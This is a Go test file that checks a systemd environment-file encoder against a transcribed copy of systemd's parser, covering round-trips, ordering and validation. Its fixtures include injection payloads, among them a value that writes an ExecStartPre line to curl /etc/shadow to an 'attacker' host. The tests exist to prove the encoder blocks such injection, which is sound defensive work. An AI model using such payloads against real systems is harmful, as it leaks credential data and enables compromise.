package deployments

import (
	"strings"
	"testing"
)

// The tests below check the encoder against a transcription of systemd's own
// environment-file parser rather than against a second copy of the encoder's
// rules. An encoder tested against its own idea of the format proves nothing:
// the only thing that matters is what systemd reads back.
//
// systemdParseEnvFile is src/basic/env-file.c's parse_env_file_internal state
// machine, transcribed. Keep it faithful to that file; do not "simplify" it to
// match whatever the encoder happens to emit.
const (
	systemdWhitespace = " \t\n\r"
	systemdNewline    = "\n\r"
	systemdComments   = "#;"
)

type envParseState int

const (
	preKey envParseState = iota
	inKey
	preValue
	inValue
	valueEscape
	singleQuoteValue
	doubleQuoteValue
	doubleQuoteValueEscape
	comment
	commentEscape
)

func systemdParseEnvFile(contents string) map[string]string {
	out := map[string]string{}
	state := preKey

	var key, value []byte
	haveValue := false
	lastKeyWS, lastValueWS := -1, -1

	push := func() {
		k := string(key)
		if lastKeyWS >= 0 && lastKeyWS <= len(k) {
			k = k[:lastKeyWS]
		}
		v := ""
		if haveValue {
			v = string(value)
			if state == inValue && lastValueWS >= 0 && lastValueWS <= len(v) {
				v = v[:lastValueWS]
			}
		}
		out[k] = v
		key = nil
		value = nil
		haveValue = false
	}

	for i := 0; i < len(contents); i++ {
		c := contents[i]
		switch state {
		case preKey:
			if strings.IndexByte(systemdComments, c) >= 0 {
				state = comment
			} else if strings.IndexByte(systemdWhitespace, c) < 0 {
				state = inKey
				lastKeyWS = -1
				key = append(key, c)
			}

		case inKey:
			if strings.IndexByte(systemdNewline, c) >= 0 {
				state = preKey
				key = nil
			} else if c == '=' {
				state = preValue
				lastValueWS = -1
			} else {
				if strings.IndexByte(systemdWhitespace, c) < 0 {
					lastKeyWS = -1
				} else if lastKeyWS < 0 {
					lastKeyWS = len(key)
				}
				key = append(key, c)
			}

		case preValue:
			switch {
			case strings.IndexByte(systemdNewline, c) >= 0:
				push()
				state = preKey
			case c == '\'':
				state = singleQuoteValue
				haveValue = true
			case c == '"':
				state = doubleQuoteValue
				haveValue = true
			case c == '\\':
				state = valueEscape
			case strings.IndexByte(systemdWhitespace, c) < 0:
				state = inValue
				haveValue = true
				value = append(value, c)
			}

		case inValue:
			switch {
			case strings.IndexByte(systemdNewline, c) >= 0:
				push()
				state = preKey
			case c == '\\':
				state = valueEscape
				lastValueWS = -1
			default:
				if strings.IndexByte(systemdWhitespace, c) < 0 {
					lastValueWS = -1
				} else if lastValueWS < 0 {
					lastValueWS = len(value)
				}
				value = append(value, c)
			}

		case valueEscape:
			state = inValue
			haveValue = true
			if strings.IndexByte(systemdNewline, c) < 0 {
				value = append(value, c)
			}

		case singleQuoteValue:
			if c == '\'' {
				state = preValue
			} else {
				value = append(value, c)
			}

		case doubleQuoteValue:
			switch c {
			case '"':
				state = preValue
			case '\\':
				state = doubleQuoteValueEscape
			default:
				value = append(value, c)
			}

		case doubleQuoteValueEscape:
			state = doubleQuoteValue
			if strings.IndexByte(shellNeedEscape, c) >= 0 {
				value = append(value, c)
			} else if c != '\n' {
				value = append(value, '\\', c)
			}

		case comment:
			if c == '\\' {
				state = commentEscape
			} else if strings.IndexByte(systemdNewline, c) >= 0 {
				state = preKey
			}

		case commentEscape:
			if strings.IndexByte(systemdNewline, c) >= 0 {
				state = preKey
			} else {
				state = comment
			}
		}
	}

	switch state {
	case preValue, inValue, valueEscape, singleQuoteValue, doubleQuoteValue, doubleQuoteValueEscape:
		push()
	}
	return out
}

// hostileValues are what a tenant can put in an environment variable. Each one
// either broke the old unit template or exercises a branch of systemd's
// double-quoted parser.
var hostileValues = map[string]string{
	"PLAIN":            "hello",
	"EMPTY":            "",
	"SPACES":           "  padded  ",
	"TAB":              "a\tb",
	"DOUBLE_QUOTE":     `say "hi"`,
	"BACKSLASH":        `C:\Users\tenant`,
	"TRAILING_SLASH":   `ends with\`,
	"DOLLAR":           "$PATH and ${HOME}",
	"BACKTICK":         "`id`",
	"NEWLINE":          "line one\nline two",
	"CRLF":             "line one\r\nline two",
	"PEM":              "-----BEGIN KEY-----\nAAAA/BBB+CCC=\n-----END KEY-----\n",
	"UNIT_INJECTION":   "x\"\nExecStartPre=/bin/sh -c 'curl http://attacker/$(cat /etc/shadow)'\nX=\"y",
	"COMMENT_START":    "#not a comment",
	"SEMICOLON":        ";also not a comment",
	"JSON":             `{"a":"b\\c","d":["e"]}`,
	"UNICODE":          "héllo — ünïcode ✅",
	"ONLY_BACKSLASHES": `\\\\`,
	"QUOTE_ONLY":       `"`,
	"SINGLE_QUOTE":     "it's",
	"EQUALS":           "a=b=c",
}

func TestRenderEnvFile_systemdReadsBackEveryValueUnchanged(t *testing.T) {
	rendered, err := RenderEnvFile(hostileValues)
	if err != nil {
		t.Fatalf("RenderEnvFile: %v", err)
	}

	got := systemdParseEnvFile(rendered)
	if len(got) != len(hostileValues) {
		t.Fatalf("systemd read back %d variables, wrote %d:\n%s", len(got), len(hostileValues), rendered)
	}
	for key, want := range hostileValues {
		if got[key] != want {
			t.Errorf("%s round-tripped wrong\n  wrote %q\n  systemd read %q", key, want, got[key])
		}
	}
}

// The injection this whole encoding exists to stop: a value that closes its own
// assignment and writes further directives. systemd must see one variable, not
// a variable plus whatever the tenant appended.
func TestRenderEnvFile_aValueCannotWriteAnotherVariable(t *testing.T) {
	rendered, err := RenderEnvFile(map[string]string{
		"USER_SET": "x\"\nINJECTED=\"gotcha",
	})
	if err != nil {
		t.Fatalf("RenderEnvFile: %v", err)
	}
	got := systemdParseEnvFile(rendered)
	if _, injected := got["INJECTED"]; injected {
		t.Fatalf("a value defined a second variable:\n%s\nparsed: %#v", rendered, got)
	}
	if got["USER_SET"] != "x\"\nINJECTED=\"gotcha" {
		t.Fatalf("USER_SET came back as %q", got["USER_SET"])
	}
}

func TestEncodeEnvFileValue_escapesExactlyTheFourSystemdCharacters(t *testing.T) {
	for _, tc := range []struct {
		name  string
		value string
		want  string
	}{
		{"nothing to escape", "abc", `"abc"`},
		{"double quote", `a"b`, `"a\"b"`},
		{"backslash", `a\b`, `"a\\b"`},
		{"backtick", "a`b", "\"a\\`b\""},
		{"dollar", "a$b", `"a\$b"`},
		{"newline stays literal", "a\nb", "\"a\nb\""},
		{"single quote stays literal", "a'b", `"a'b"`},
		{"empty", "", `""`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := EncodeEnvFileValue(tc.value); got != tc.want {
				t.Errorf("EncodeEnvFileValue(%q) = %q, want %q", tc.value, got, tc.want)
			}
		})
	}
}

func TestRenderEnvFile_ordersKeysSoAnUnchangedEnvironmentRendersIdentically(t *testing.T) {
	env := map[string]string{"ZULU": "1", "alpha": "2", "MIKE": "3"}
	first, err := RenderEnvFile(env)
	if err != nil {
		t.Fatalf("RenderEnvFile: %v", err)
	}
	for i := 0; i < 20; i++ {
		again, err := RenderEnvFile(env)
		if err != nil {
			t.Fatalf("RenderEnvFile: %v", err)
		}
		if again != first {
			t.Fatalf("two renders of the same environment differ:\n%q\n%q", first, again)
		}
	}
	want := "MIKE=\"3\"\nZULU=\"1\"\nalpha=\"2\"\n"
	if first != want {
		t.Fatalf("rendered %q, want %q", first, want)
	}
}

func TestRenderEnvFile_empty(t *testing.T) {
	got, err := RenderEnvFile(nil)
	if err != nil {
		t.Fatalf("RenderEnvFile(nil): %v", err)
	}
	if got != "" {
		t.Fatalf("an empty environment rendered %q", got)
	}
}

func TestValidateEnvValue_refusesWhatSystemdWouldSilentlyDrop(t *testing.T) {
	if err := ValidateEnvValue("K", "\xff\xfe"); err == nil {
		t.Error("invalid UTF-8 was accepted; systemd discards the assignment and the variable is simply missing at runtime")
	}
	if err := ValidateEnvValue("K", "a\x00b"); err == nil {
		t.Error("a NUL byte was accepted; a process environment cannot carry one")
	}
	if err := ValidateEnvValue("K", strings.Repeat("x", MaxEnvValueBytes+1)); err == nil {
		t.Error("an oversized value was accepted; every value is replicated to every node")
	}
	if err := ValidateEnvValue("K", strings.Repeat("x", MaxEnvValueBytes)); err != nil {
		t.Errorf("a value exactly at the limit was refused: %v", err)
	}
	if err := ValidateEnvValue("K", "héllo\nworld\t"); err != nil {
		t.Errorf("a legitimate multi-line unicode value was refused: %v", err)
	}
}

func TestValidateEnvName(t *testing.T) {
	for _, ok := range []string{"A", "_", "DATABASE_URL", "a1", "_x9"} {
		if err := ValidateEnvName(ok); err != nil {
			t.Errorf("ValidateEnvName(%q) = %v, want nil", ok, err)
		}
	}
	for _, bad := range []string{"", "1ABC", "A-B", "A B", "A=B", "A\nB", "Ä"} {
		if err := ValidateEnvName(bad); err == nil {
			t.Errorf("ValidateEnvName(%q) = nil, want an error", bad)
		}
	}
}

func TestValidateEnv_reportsTheOffendingVariable(t *testing.T) {
	err := ValidateEnv(map[string]string{"GOOD": "1", "BAD_VALUE": "\xff"})
	if err == nil {
		t.Fatal("ValidateEnv accepted an invalid value")
	}
	if !strings.Contains(err.Error(), "BAD_VALUE") {
		t.Errorf("the error does not name the variable: %v", err)
	}
}

func TestRenderEnvFile_refusesAnInvalidValueInsteadOfWritingIt(t *testing.T) {
	if _, err := RenderEnvFile(map[string]string{"K": "\xff"}); err == nil {
		t.Fatal("RenderEnvFile wrote a value systemd would discard")
	}
	if _, err := RenderEnvFile(map[string]string{"1BAD": "x"}); err == nil {
		t.Fatal("RenderEnvFile wrote an unusable variable name")
	}
}
